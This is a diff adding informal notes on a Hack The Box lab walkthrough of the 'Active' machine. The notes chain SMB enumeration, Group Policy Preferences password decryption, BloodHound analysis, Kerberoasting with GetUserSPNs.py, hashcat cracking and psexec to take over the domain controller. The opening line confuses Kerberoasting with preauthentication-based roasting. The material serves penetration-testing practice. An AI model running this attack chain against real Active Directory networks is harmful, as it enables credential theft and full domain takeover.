@@ -1,0 +1,50 @@
+Kerberoast - preauthentication is enabled and you can get hash for a user
+
+Port 53 - DNS
+Port 88 - Kerberos -> gives time -> make sure your box is within a minute? of the time
+Port 389 - LDAP -> gives Domain (active.htb) -> adds to /etc/hosts
+Port 445 - microsoft-ds -> SMB: You should see shares in a domain controller.
+
+nslookup; 127.0.0.1;
+dnsrecon -d 10.10.10.100 -r 10.0.0.0/8
+
+locate -r '\.nse$' -> shows all map scripts
+locate -r '\.nse$' | xargs grep categories
+doing safe we get more smb scripts
+nmap --script safe -p 445 10.10.10.100
+
+smbclient -L //IP (anonymous authentication)
+Because it's a domain controller we should see IPC$ and SYSVLO and stuff
+smbmap -H IP
+smbmap -R Replicaton -H IP (will list the contents of a directory) -> Very good
+He looks at Groups.xml -> stored in a reversible format
+smbmap -R Replication -H IP -A Groups.xml -q -> downloads file
+updated; locate Groups.xml; (you can also log in with smbclient and do mget *)
+
+He gets an encrypted password for user SVC_TGS.
+gpp-decrypt HASH
+
+GetADUsers.py -all active.htb/svc_tg -dc-ip IP -> gets all users in AD
+We can attempt psexec.py active.htb/svc_tgs@IP -> if we are admin user we might run
+
+smbmap -d active.htb -u svc_tgs -p PASSWORD -H IP (see our access to shares with a user)
+
+Gets user creds.
+Runs bloodhound in Windows:
+runas /netonly /user:USER cmd (creates a session but doesn't validate that the user exists or not, Windows tries to do its SSO magic passing NTLM hashes)
+runas /netonly /user:active.htb\svc_tgs cmd
+Then he does dir \\10.10.10.100\Users - he got access
+
+powershell; .\SharpHound -c all -d active.htb --domaincontroller 10.10.10.100 (did not work)
+Test-NetConnection -ComputerName 10.10.10.100 -Port 389
+He changes the DNS server in Windows (he didn't see any traffic) to 10.10.10.100
+Now it works
+Start neo4j; start BloodHound; Import zip file
+First thing he does is look a path from SVC_TGS to DOMAIN ADMINS
+User Administrator is Kerberoastable
+
+GetUsersSPNs.py -request -dc-ip IP active.htb/svc_tgs
+He gets the ticket for Administrator
+hashcat -m 13100 file rockyou.txt
+Gets password
+psexec.py active.htb/Administrator@IP
